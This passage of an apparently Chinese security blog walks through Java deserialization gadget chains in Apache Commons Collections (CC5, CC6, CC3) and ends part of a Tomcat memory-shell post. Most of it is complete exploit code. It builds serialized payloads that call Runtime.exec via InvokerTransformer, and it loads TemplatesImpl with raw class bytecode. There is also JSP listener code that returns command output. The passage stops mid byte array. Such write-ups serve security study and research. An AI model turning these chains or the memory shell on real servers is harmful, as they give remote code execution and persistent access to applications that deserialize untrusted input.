                &#125; catch (IllegalAccessException e) &#123;
                    throw new RuntimeException(e);
                &#125;
                try &#123;
                    response.getWriter().write(br.lines().collect(Collectors.joining(&quot;\n&quot;)));
                &#125; catch (IOException e) &#123;
                    throw new RuntimeException(e);
                &#125;
            &#125;
        &#125;

        @Override
        public void requestInitialized(ServletRequestEvent sre) &#123;&#125;
    &#125;


%&gt;
</code></pre>
<p>另一种getContext的方法</p>
<pre><code class="java">WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
    StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
</code></pre>
<h2 id=""><a href="#" class="headerlink" title=""></a></h2>
            
        </div>
    </div>
    <div class="post-tags">
        
        <span class="icon">
            <i class="fa-solid fa-tags fa-fw"></i>
        </span>
        
        
        
        <span class="tag">
            
            <a href="/tags/java/" style="color: #00a596">java</a>
        </span>
        
    </div>
    <a href="/2024/03/14/TomcatMemShell/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/2024/03/03/CommonsCollections5-6/">
        <h2 class="post-title">CommonsCollections5 6</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2024/3/3
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <h1 id="cc5"><a href="#cc5" class="headerlink" title="cc5"></a>cc5</h1><pre><code class="ini">Gadget chain:
        ObjectInputStream.readObject()
            BadAttributeValueExpException.readObject()
                TiedMapEntry.toString()
                    LazyMap.get()
                        ChainedTransformer.transform()
                            ConstantTransformer.transform()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Class.getMethod()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.getRuntime()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.exec()
</code></pre>
<p>相较于cc1 把LazyMap的上层改了 没有使用动态代理</p>
<p>拼一下先</p>
<p>然后去找调用get的</p>
<p>调用get的非常多 这里选择的是<code>TiedMapEntry.toString()</code></p>
<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403030807002.png" alt="image-20240303080650311"></p>
<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403030807992.png" alt="image-20240303080733554"></p>
<p>toString也非常多</p>
<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403030809346.png" alt="image-20240303080955216"></p>
<p>这里用的BadAttributeValueExpException#ReadObject</p>
<pre><code class="java">import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;

import javax.management.BadAttributeValueExpException;
import javax.xml.ws.Action;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;


public class CC5 &#123;
    public static void main(String[] args) throws Exception &#123;
        String payload = &quot;calc&quot;;

        HashMap hashMap = new HashMap();
        hashMap.put(&quot;fault&quot;,&quot;fault&quot;);
        Transformer[] transformers = &#123;
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(&quot;getDeclaredMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),
                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),
                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;payload&#125;)
        &#125;;
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);


        LazyMap lazyMap = (LazyMap) LazyMap.decorate(hashMap,chainedTransformer);
        BadAttributeValueExpException bavee = new BadAttributeValueExpException(new TiedMapEntry(lazyMap,null));


//        byte[] bytes = serialize(bavee);
//        System.out.println(Base64.getEncoder().encodeToString(bytes));
        

//        unSerialize(bytes);

    &#125;

    public static byte[] serialize(Object obj) &#123;
        try &#123;
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baos);
            oos.writeObject(obj);
            return baos.toByteArray();
        &#125; catch (IOException e) &#123;
            throw new RuntimeException(e);
        &#125;
    &#125;
    public static Object unSerialize(byte[] bytes) &#123;
        try &#123;
            ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes));
            return ois.readObject();
        &#125; catch (IOException e) &#123;
            throw new RuntimeException(e);
        &#125; catch (ClassNotFoundException e) &#123;
            throw new RuntimeException(e);
        &#125;

    &#125;



&#125;
</code></pre>
<p>我们发现在还没反序列化的时候就弹计算器了</p>
<p>那么我们就要用反射赋值</p>
<p>在生成的时候打断链子</p>
<pre><code class="java">import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;


public class CC5 &#123;
    public static void main(String[] args) throws Exception &#123;
        String payload = &quot;calc&quot;;

        HashMap hashMap = new HashMap();
        hashMap.put(&quot;fault&quot;,&quot;fault&quot;);
        Transformer[] transformers = &#123;
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(&quot;getDeclaredMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),
                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),
                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;payload&#125;)
        &#125;;
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);


        LazyMap lazyMap = (LazyMap) LazyMap.decorate(hashMap,chainedTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, null);
        BadAttributeValueExpException bavee = new BadAttributeValueExpException(1);

        Field fieldVal = bavee.getClass().getDeclaredField(&quot;val&quot;);
        fieldVal.setAccessible(true);
        fieldVal.set(bavee,tiedMapEntry);

        byte[] bytes = serialize(bavee);
//        System.out.println(Base64.getEncoder().encodeToString(bytes));


        unSerialize(bytes);

    &#125;

    public static byte[] serialize(Object obj) &#123;
        try &#123;
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baos);
            oos.writeObject(obj);
            return baos.toByteArray();
        &#125; catch (IOException e) &#123;
            throw new RuntimeException(e);
        &#125;
    &#125;
    public static Object unSerialize(byte[] bytes) &#123;
        try &#123;
            ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes));
            return ois.readObject();
        &#125; catch (IOException e) &#123;
            throw new RuntimeException(e);
        &#125; catch (ClassNotFoundException e) &#123;
            throw new RuntimeException(e);
        &#125;

    &#125;



&#125;
</code></pre>
<h1 id="cc6"><a href="#cc6" class="headerlink" title="cc6"></a>cc6</h1><pre><code class="ini">Gadget chain:
        java.io.ObjectInputStream.readObject()
            java.util.HashSet.readObject()
                java.util.HashMap.put()
                java.util.HashMap.hash()
                   TiedMapEntry.hashCode()
                    TiedMapEntry.getValue()
                        LazyMap.get()
                           ChainedTransformer.transform()
                           InvokerTransformer.transform()
</code></pre>
<p><code>TiedMapEntry#hashCode</code>调了getValue</p>
<p><code>HashMap#hash调了hashcode</code></p>
<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403030909384.png" alt="image-20240303090927274"></p>
<p><code>HashMap#readObject-&gt; HashMap#hash</code></p>
<p>需要注意的是<code>HashMap#put</code>也调用了HashMap#hash 由HashSet#ReadObject可以跟进来</p>
<h2 id="HashMap版"><a href="#HashMap版" class="headerlink" title="HashMap版"></a>HashMap版</h2><p>需要注意的是还没反序列化的时候就弹计算器了 需要手动断一下链子 反射补上 和 URLDNS那个是一个问题</p>
<p><img src="https://img-blog.csdnimg.cn/db9bcf8b2d5240efb99a9c6adaa8ba27.png" alt="在这里插入图片描述"></p>
<p>put完了之后进不去</p>
<p>所以最后要remove掉put进去的key</p>
<pre><code class="java">import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;


import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;



public class CC6 &#123;
    public static void main(String[] args) throws Exception &#123;
        String payload = &quot;calc&quot;;

        HashMap hashMap = new HashMap();
        hashMap.put(&quot;fault&quot;,&quot;fault&quot;);
        Transformer[] transformers = &#123;
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(&quot;getDeclaredMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),
                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),
                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;payload&#125;)
        &#125;;
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);


        LazyMap lazyMap = (LazyMap) LazyMap.decorate(hashMap,new ConstantTransformer(1));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,&quot;xxx&quot;);
        HashMap&lt;Object, Object&gt; finalMap = new HashMap&lt;&gt;();
        finalMap.put(tiedMapEntry,null);
        lazyMap.remove(&quot;xxx&quot;);


        Field fieldFactory = lazyMap.getClass().getDeclaredField(&quot;factory&quot;);
        fieldFactory.setAccessible(true);
        fieldFactory.set(lazyMap,chainedTransformer);
        byte[] bytes = serialize(finalMap);

        unSerialize(bytes);

    &#125;

    public static byte[] serialize(Object obj) &#123;
        try &#123;
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baos);
            oos.writeObject(obj);
            return baos.toByteArray();
        &#125; catch (IOException e) &#123;
            throw new RuntimeException(e);
        &#125;
    &#125;
    public static Object unSerialize(byte[] bytes) &#123;
        try &#123;
            ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes));
            return ois.readObject();
        &#125; catch (IOException e) &#123;
            throw new RuntimeException(e);
        &#125; catch (ClassNotFoundException e) &#123;
            throw new RuntimeException(e);
        &#125;

    &#125;



&#125;
</code></pre>
<h2 id="HashSet版"><a href="#HashSet版" class="headerlink" title="HashSet版"></a>HashSet版</h2><p>网上找了几篇都没写HashSet的 不知道为什么</p>
<pre><code class="java">import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;


import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.HashSet;


public class CC6 &#123;
    public static void main(String[] args) throws Exception &#123;
        String payload = &quot;calc&quot;;

        HashMap hashMap = new HashMap();
        hashMap.put(&quot;fault&quot;,&quot;fault&quot;);
        Transformer[] transformers = &#123;
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(&quot;getDeclaredMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),
                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),
                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;payload&#125;)
        &#125;;
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);


        LazyMap lazyMap = (LazyMap) LazyMap.decorate(hashMap,new ConstantTransformer(1));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,&quot;xxx&quot;);
        HashMap&lt;Object, Object&gt; finalMap = new HashMap&lt;&gt;();
        finalMap.put(tiedMapEntry,null);
        lazyMap.remove(&quot;xxx&quot;);


        Field fieldFactory = lazyMap.getClass().getDeclaredField(&quot;factory&quot;);
        fieldFactory.setAccessible(true);
        fieldFactory.set(lazyMap,chainedTransformer);

        HashSet hashSet = new HashSet(1,1);
        Field fieldMap = HashSet.class.getDeclaredField(&quot;map&quot;);
        fieldMap.setAccessible(true);
        fieldMap.set(hashSet,finalMap);

        byte[] bytes = serialize(hashSet);

        unSerialize(bytes);

    &#125;

    public static byte[] serialize(Object obj) &#123;
        try &#123;
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baos);
            oos.writeObject(obj);
            return baos.toByteArray();
        &#125; catch (IOException e) &#123;
            throw new RuntimeException(e);
        &#125;
    &#125;
    public static Object unSerialize(byte[] bytes) &#123;
        try &#123;
            ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes));
            return ois.readObject();
        &#125; catch (IOException e) &#123;
            throw new RuntimeException(e);
        &#125; catch (ClassNotFoundException e) &#123;
            throw new RuntimeException(e);
        &#125;

    &#125;



&#125;
</code></pre>

            
        </div>
    </div>
    <div class="post-tags">
        
        <span class="icon">
            <i class="fa-solid fa-tags fa-fw"></i>
        </span>
        
        
        
        <span class="tag">
            
            <a href="/tags/java/" style="color: #ff7d73">java</a>
        </span>
        
    </div>
    <a href="/2024/03/03/CommonsCollections5-6/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/2024/03/03/CommonsCollections3-4/">
        <h2 class="post-title">CommonsCollections3 4</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2024/3/3
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <h1 id="cc3"><a href="#cc3" class="headerlink" title="cc3"></a>cc3</h1><p>ysoserial上写到</p>
<pre><code> * Variation on CommonsCollections1 that uses InstantiateTransformer instead of
 * InvokerTransformer.
</code></pre>
<p>在cc1的基础上 将InstantiateTransformer替换InvokerTransformer</p>
<p>那么别的地方照抄</p>
<p>我们看看InstantiateTransformer是怎么回事</p>
<p>InstantiateTransformer#transform</p>
<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202402241039413.png" alt="image-20240224103945270"></p>
<p>实例化input</p>
<p>其中的iParamTypes 和 iArgs 通过</p>
<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403030755274.png" alt="image-20240224104055577"></p>
<p>写个demo</p>
<pre><code class="java">        Transformer instance = InstantiateTransformer.getInstance(new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;hahaha&quot;&#125;);
        System.out.println(instance.transform(String.class));
</code></pre>
<p>然后正式开始跟链子</p>
<p>cc3是靠defineClass加载字节码来触发的</p>
<p>触发点在Classloader#definClass()</p>
<p>所以我们要找谁调了defineClass</p>
<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403030755103.png" alt="image-20240224114836243"></p>
<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403030755299.png" alt="image-20240224114854562"></p>
<p><code>TemplatesImpl</code>的内部类<code>TransletClassLoader</code>调用了defineClass</p>
<p><code>TransletClassLoader#defineTransletClasses</code></p>
<p>往前 <code>TemplatesImpl#getTransletInstance</code></p>
<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403030755234.png" alt="image-20240224115312589"></p>
<p>往前 <code>TemplatesImpl#newTransformer</code></p>
<p>这个方法是public的 在这就可以停了</p>
<p>我们写个demo测一下 _name要非空</p>
<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403030755013.png" alt="image-20240224120948653"></p>
<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403030755869.png" alt="image-20240224121105176"></p>
<p>这里<code>_tfactory</code>要非空 不然nullPointer</p>
<pre><code class="java">        byte[][] _bytecodes = new byte[][]&#123;&#123;-54, -2, -70, -66, 0, 0, 0, 52, 0, 40, 10, 0, 9, 0, 24, 10, 0, 25, 0, 26, 8, 0, 27, 10, 0, 25, 0, 28, 7, 0, 29, 7, 0, 30, 10, 0, 6, 0, 31, 7, 0, 32, 7, 0, 33, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100, 101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101, 1, 0, 18, 76, 111, 99, 97, 108, 86, 97, 114, 105, 97, 98, 108, 101, 84, 97, 98, 108, 101, 1, 0, 4, 116, 104, 105, 115, 1, 0, 6, 76, 69, 118, 105, 108, 59, 1, 0, 8, 60, 99, 108, 105, 110, 105, 116, 62, 1, 0, 1, 101, 1, 0, 21, 76, 106, 97, 118, 97, 47, 105, 111, 47, 73, 79, 69, 120, 99, 101, 112, 116, 105, 111, 110, 59, 1, 0, 13, 83, 116, 97, 99, 107, 77, 97, 112, 84, 97, 98, 108, 101, 7, 0, 29, 1, 0, 10, 83, 111, 117, 114, 99, 101, 70, 105, 108, 101, 1, 0, 9, 69, 118, 105, 108, 46, 106, 97, 118, 97, 12, 0, 10, 0, 11, 7, 0, 34, 12, 0, 35, 0, 36, 1, 0, 4, 99, 97, 108, 99, 12, 0, 37, 0, 38, 1, 0, 19, 106, 97, 118, 97, 47, 105, 111, 47, 73, 79, 69, 120, 99, 101, 112, 116, 105, 111, 110, 1, 0, 26, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 82, 117, 110, 116, 105, 109, 101, 69, 120, 99, 101, 112, 116, 105, 111, 110, 12, 0, 10, 0, 39, 1, 0, 4, 69, 118, 105, 108, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 1, 0, 17, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 82, 117, 110, 116, 105, 109, 101, 1, 0, 10, 103, 101, 116, 82, 117, 110, 116, 105, 109, 101, 1, 0, 21, 40, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 82, 117, 110, 116, 105, 109, 101, 59, 1, 0, 4, 101, 120, 101, 99, 1, 0, 39, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 80, 114, 111, 99, 101, 115, 115, 59, 1, 0, 24, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 84, 104, 114, 111, 119, 97, 98, 108, 101, 59, 41, 86, 0, 33, 0, 8, 0, 9, 0, 0, 0, 0, 0, 2, 0, 1, 0, 10, 0, 11, 0, 1, 0, 12, 0, 0, 0, 47, 0, 1, 0, 1, 0, 0, 0, 5, 42, -73, 0, 1, -79, 0, 0, 0, 2, 0, 13, 0, 0, 0, 6, 0, 1, 0, 0, 0, 3, 0, 14, 0, 0, 0, 12, 0, 1, 0, 0, 0, 5, 0, 15, 0, 16, 0, 0, 0, 8, 0, 17, 0, 11, 0, 1, 0, 12, 0, 0, 0, 102, 0, 3, 0, 1, 0, 0, 0, 23, -72, 0, 2, 18, 3, -74, 0, 4, 87, -89, 0, 13, 75, -69, 0, 6, 89, 42, -73, 0, 7, -65, -79, 0, 1, 0, 0, 0, 9, 0, 12, 0, 5, 0, 3, 0, 13, 0, 0, 0, 22, 0, 5, 0, 0, 0, 6, 0, 9, 0, 9, 0, 12, 0, 7, 0, 13, 0, 8, 0, 22, 0, 10, 0, 14, 0, 0, 0, 12, 0, 1, 0, 13, 0, 9, 0, 18, 0, 19, 0, 0, 0, 20, 0, 0, 0, 7, 0, 2, 76, 7, 0, 21, 9, 0, 1, 0, 22, 0, 0, 0, 2, 0, 23, &#125;&#125;;
        TemplatesImpl templates = new TemplatesImpl();
        Field fieldBytecodes = templates.getClass().getDeclaredField(&quot;_bytecodes&quot;);
        Field fieldName = templates.getClass().getDeclaredField(&quot;_name&quot;);
        Field fieldTfactory = templates.getClass().getDeclaredField(&quot;_tfactory&quot;);
        fieldBytecodes.setAccessible(true);
        fieldName.setAccessible(true);
        fieldTfactory.setAccessible(true);
        fieldBytecodes.set(templates,_bytecodes);
        fieldName.set(templates,&quot;aa&quot;);
        fieldTfactory.set(templates,new TransformerFactoryImpl());

        templates.newTransformer();
</code></pre>
<p>尝试运行 发现不行 确实是跟到defineclass里面了 但是没有弹计算器</p>
<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403030755630.png" alt="image-20240224122910769"></p>
<p>这里Evil类要继承com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</p>
<p>修改后测试成功</p>
<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403030755271.png" alt="image-20240224123124553"></p>
<p>TemplatesImpl 实现了 Serializable接口</p>
<p>后面和cc1差不多 改改就能用了</p>
<p>这里还要继续找谁调了<code>newTransformer</code></p>
<p>在<code>TrAXFilter</code>的构造函数中调了</p>
<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403030755142.png" alt="image-20240224123954328"></p>
<p>结合之前说的InstantiateTransformer可以进行实例化 于是transformers如下</p>
<pre><code class="java">Transformer[] transformers = new Transformer[]&#123;
            new ConstantTransformer(TrAXFilter.class),
            new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125;)
        &#125;;
</code></pre>
<pre><code class="java">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;
import org.apache.commons.collections.Transformer;

import javax.xml.transform.Templates;
import javax.xml.transform.TransformerConfigurationException;
import javax.xml.ws.Action;
import java.io.*;
import java.lang.reflect.*;
import java.util.HashMap;
import java.util.Map;

public class CC3 &#123;
    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, TransformerConfigurationException, NoSuchFieldException, IOException &#123;
        HashMap hashMap = new HashMap();
        hashMap.put(&quot;fault&quot;,&quot;fault&quot;);


        byte[][] _bytecodes = new byte[][]&#123;&#123;-54, -2, -70, -66, 0, 0, 0, 52, 0, 54, 10, 0, 9, 0, 37, 10, 0, 38, 0, 39, 8, 0, 40, 10, 0, 38, 0, 41, 7, 0, 42, 7, 0, 43, 10, 0, 6, 0, 44, 7, 0, 45, 7, 0, 46, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100, 101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101, 1, 0, 18, 76, 111, 99, 97, 108, 86, 97, 114, 105, 97, 98, 108, 101, 84, 97, 98, 108, 101, 1, 0, 4, 116, 104, 105, 115, 1, 0, 6, 76, 69, 118, 105, 108, 59, 1, 0, 9, 116, 114, 97, 110, 115, 102, 111, 114, 109, 1, 0, 114, 40, 76, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 97, 108, 97, 110, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 120, 115, 108, 116, 99, 47, 68, 79, 77, 59, 91, 76, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 109, 108, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 115, 101, 114, 105, 97, 108, 105, 122, 101, 114, 47, 83, 101, 114, 105, 97, 108, 105, 122, 97, 116, 105, 111, 110, 72, 97, 110, 100, 108, 101, 114, 59, 41, 86, 1, 0, 8, 100, 111, 99, 117, 109, 101, 110, 116, 1, 0, 45, 76, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 97, 108, 97, 110, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 120, 115, 108, 116, 99, 47, 68, 79, 77, 59, 1, 0, 8, 104, 97, 110, 100, 108, 101, 114, 115, 1, 0, 66, 91, 76, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 109, 108, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 115, 101, 114, 105, 97, 108, 105, 122, 101, 114, 47, 83, 101, 114, 105, 97, 108, 105, 122, 97, 116, 105, 111, 110, 72, 97, 110, 100, 108, 101, 114, 59, 1, 0, 10, 69, 120, 99, 101, 112, 116, 105, 111, 110, 115, 7, 0, 47, 1, 0, -90, 40, 76, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 97, 108, 97, 110, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 120, 115, 108, 116, 99, 47, 68, 79, 77, 59, 76, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 109, 108, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 100, 116, 109, 47, 68, 84, 77, 65, 120, 105, 115, 73, 116, 101, 114, 97, 116, 111, 114, 59, 76, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 109, 108, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 115, 101, 114, 105, 97, 108, 105, 122, 101, 114, 47, 83, 101, 114, 105, 97, 108, 105, 122, 97, 116, 105, 111, 110, 72, 97, 110, 100, 108, 101, 114, 59, 41, 86, 1, 0, 8, 105, 116, 101, 114, 97, 116, 111, 114, 1, 0, 53, 76, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 109, 108, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 100, 116, 109, 47, 68, 84, 77, 65, 120, 105, 115, 73, 116, 101, 114, 97, 116, 111, 114, 59, 1, 0, 7, 104, 97, 110, 100, 108, 101, 114, 1, 0, 65, 76, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 109, 108, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 115, 101, 114, 105, 97, 108, 105, 122, 101, 114, 47, 83, 101, 114, 105, 97, 108, 105, 122, 97, 116, 105, 111, 110, 72, 97, 110, 100, 108, 101, 114, 59, 1, 0, 8, 60, 99, 108, 105, 110, 105, 116, 62, 1, 0, 1, 101, 1, 0, 21, 76, 106, 97, 118, 97, 47, 105, 111, 47, 73, 79, 69, 120, 99, 101, 112, 116, 105, 111, 110, 59, 1, 0, 13, 83, 116, 97, 99, 107, 77, 97, 112, 84, 97, 98, 108, 101, 7, 0, 42, 1, 0, 10, 83, 111, 117, 114, 99, 101, 70, 105, 108, 101, 1, 0, 9, 69, 118, 105, 108, 46, 106, 97, 118, 97, 12, 0, 10, 0, 11, 7, 0, 48, 12, 0, 49, 0, 50, 1, 0, 4, 99, 97, 108, 99, 12, 0, 51, 0, 52, 1, 0, 19, 106, 97, 118, 97, 47, 105, 111, 47, 73, 79, 69, 120, 99, 101, 112, 116, 105, 111, 110, 1, 0, 26, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 82, 117, 110, 116, 105, 109, 101, 69, 120, 99, 101, 112, 116, 105, 111, 110, 12, 0, 10, 0, 53, 1, 0, 4, 69, 118, 105, 108, 1, 0, 64, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 97, 108, 97, 110, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 120, 115, 108, 116, 99, 47, 114, 117, 110, 116, 105, 109, 101, 47, 65, 98, 115, 116, 114, 97, 99, 116, 84, 114, 97, 110, 115, 108, 101, 116, 1, 0, 57, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 97, 108, 97, 110, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 120, 115, 108, 116, 99, 47, 84, 114, 97, 110, 115, 108, 101, 116, 69, 120, 99, 101, 112, 116, 105, 111, 110, 1, 0, 17, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 82, 117, 110, 116, 105, 109, 101, 1, 0, 10, 103, 101, 116, 82, 117, 110, 116, 105, 109, 101, 1, 0, 21, 40, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 82, 117, 110, 116, 105, 109, 101, 59, 1, 0, 4, 101, 120, 101, 99, 1, 0, 39, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 80, 114, 111, 99, 101, 115, 115, 59, 1, 0, 24, 40, 76, 106, 